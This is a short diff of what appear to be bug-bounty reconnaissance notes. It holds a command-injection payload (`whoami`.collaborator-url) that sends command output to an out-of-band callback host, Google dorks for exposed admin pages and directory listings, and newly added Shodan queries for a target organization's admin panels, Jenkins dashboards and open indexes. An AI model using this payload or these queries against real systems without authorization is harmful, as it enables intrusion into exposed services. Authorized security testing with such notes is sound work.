@@ -45,7 +45,7 @@
           If you got HTTP pingback on your server, also give this a try
           payload used   :  `whoami`.collaborator-url 
           got callback from  :  root.collaborator-url
-        
+      
         
 google dorks :   
   site:target.com inurl:adminintitle:login 
@@ -54,6 +54,12 @@ google dorks :
   intitle:admin intext:admin
   index of / site: /etc/certs + "index of /" */* site:example.com
   
+  http.title:"admin panel" org:<TARGET ORGANIZATION>
+"http.title:\"index of\" AND org:<TARGET ORGANIZATION>"
+"http.title:\"Dashboard [Jenkins]\" AND org:<TARGET ORGANIZATION>"
+"http.title:\"login\" AND org:<TARGET ORGANIZATION>
+
+
   administrator | debug | login | root | wp-login | master | superuser
   example.com/wp-content/uploads/2021/      >> wordpress 
   example.com/wp-inc/       >> for wp-db files
